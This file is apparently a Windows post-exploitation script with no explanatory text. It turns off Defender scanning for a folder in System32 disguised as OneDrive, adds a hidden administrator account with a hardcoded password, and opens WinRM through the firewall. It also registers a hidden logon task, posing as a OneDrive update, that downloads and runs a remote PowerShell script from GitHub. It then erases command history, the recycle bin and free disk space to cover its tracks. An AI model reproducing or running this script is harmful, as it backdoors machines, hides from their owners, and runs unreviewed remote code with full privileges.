cd $env:SystemRoot\System32
mkdir Microsoft_OneDrive
Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive
cd Microsoft_OneDrive
mkdir AA
mkdir AB
mkdir AC
mkdir AD
mkdir AE
mkdir AF
mkdir AG
mkdir AH
mkdir AI
mkdir AJ
mkdir AK
mkdir AL
mkdir AM
mkdir AN
mkdir AO
mkdir AP
mkdir AQ
mkdir AR
mkdir AS
mkdir AT
mkdir AU
mkdir AV
mkdir AW
mkdir AX
mkdir AY
mkdir AZ
mkdir BA
mkdir BB
mkdir BC
mkdir BD
mkdir BE
mkdir BF
mkdir BG
mkdir BH
mkdir BI
mkdir BJ
mkdir BK
mkdir BL
mkdir BM
mkdir BN
mkdir BO
mkdir BP
mkdir BQ
mkdir BR
mkdir BS
mkdir BT
mkdir BU
mkdir BV
mkdir BW
mkdir BX
mkdir BY
mkdir BZ
Set-MpPreference -ExclusionPath $env:SystemRoot\System32\Microsoft_OneDrive\BQ






NET USER AWORTH Imperator877 /ADD
NET LOCALGROUP Administrators AWORTH /ADD
winrm quickconfig -quiet
NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Remote Management for RD" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v AWORTH /t REG_DWORD /d 0
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f




$action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoP -NonI -Exec Bypass $BPP = iwr https://github.com/skekic16/lol/raw/main/BPP.ps1?dl=1; invoke-expression $BPP'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
Register-ScheduledTask T1 -InputObject $task -Force -TaskName Microsoft_OneDrive_Update -User $env:UserName

function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
start powershell -argumentlist '-windowstyle hidden cipher /w:c'
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit



